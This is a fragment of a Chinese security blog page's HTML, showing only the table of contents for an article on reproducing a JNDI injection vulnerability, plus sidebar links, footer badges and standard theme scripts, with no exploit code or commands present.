class="toc-text">0x01.漏洞情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D"><span class="toc-text">0x02.组件介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RIM"><span class="toc-text">RIM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP"><span class="toc-text">LDAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI"><span class="toc-text">JNDI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-text">0x03.漏洞利用原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">0x04.漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0"><span class="toc-text">本地复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-text">复现的流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#server%E5%BC%80%E5%90%AF%E4%B8%80%E4%B8%AArmi"><span class="toc-text">server开启一个rmi</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E7%9A%84%E4%BB%A3%E7%A0%81%E5%BA%93%E4%B8%AD%E7%9A%84hack%E7%B1%BB"><span class="toc-text">恶意的代码库中的hack类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-text">客户端</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#docker%E6%90%AD%E5%BB%BA"><span class="toc-text">docker搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%97%E5%AE%B3%E8%80%85%E9%83%A8%E7%BD%B2"><span class="toc-text">受害者部署</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%81%B6%E6%84%8FJNDI%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2"><span class="toc-text">恶意JNDI服务器部署</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E8%AF%B7%E6%B1%82"><span class="toc-text">构造恶意请求</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="toc-text">0x05.参考文献</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/11/28/PE_DLL/" title="通过修改 PE 装载 DLL 实验"><img src="https://cdn.niceasiv.cn/image-20221129184740738.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="通过修改 PE 装载 DLL 实验"/></a><div class="content"><a class="title" href="/2022/11/28/PE_DLL/" title="通过修改 PE 装载 DLL 实验">通过修改 PE 装载 DLL 实验</a><time datetime="2022-11-28T10:16:09.000Z" title="Created 2022-11-28 18:16:09">2022-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/22/cluster/" title="KNN&amp;DBscan&amp;K-means实现"><img src="https://cdn.niceasiv.cn/20210526131701159.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="KNN&amp;DBscan&amp;K-means实现"/></a><div class="content"><a class="title" href="/2022/11/22/cluster/" title="KNN&amp;DBscan&amp;K-means实现">KNN&amp;DBscan&amp;K-means实现</a><time datetime="2022-11-22T12:51:09.000Z" title="Created 2022-11-22 20:51:09">2022-11-22</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://picx1.zhimg.com/v2-6c432537a88e7fdd8a275bd0bda88791_720w.jpg?source=172ae18b')"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 NiceAsiv</div><div class="framework-info"></div><div class="framework-info"><span class="footer-separator"> </span><a target="_blank" rel="noopener" href="https://hexo.io"><img class="entered loading" src="https://img.shields.io/badge/Frame-Hexo-blue?style=plastic&amp;logo=hexo" title="博客框架为Hexo" alt="hexo" data-ll-status="loading"/></a><span class="footer-separator"> </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly"><img class="entered loading" src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=plastic&amp;amp&amp;logo=bitdefender" title="主题采用butterfly" alt="主题采用butterfly" data-ll-status="loading"/></a><span class="footer-separator"> </span><a target="_blank" rel="noopener" href="https://www.jsdelivr.com/"> <img class="entered loading" src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=plastic&amp;amp&amp;logo=jsDelivr" title="本站使用JsDelivr为静态资源提供CDN加速" alt="jsd加速" data-ll-status="loading"/></a><span class="footer-separator"></span><a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"> <img class="entered loading" src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=plastic&amp;amp&amp;logo=Claris" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" alt="协议" data-ll-status="loading"/></a></div><div class="framework-info"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">陕ICP备2021014123号-1</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex/dist/contrib/copy-tex.min.js"></script><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', { class: 'katex-wrap'})
+  })
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
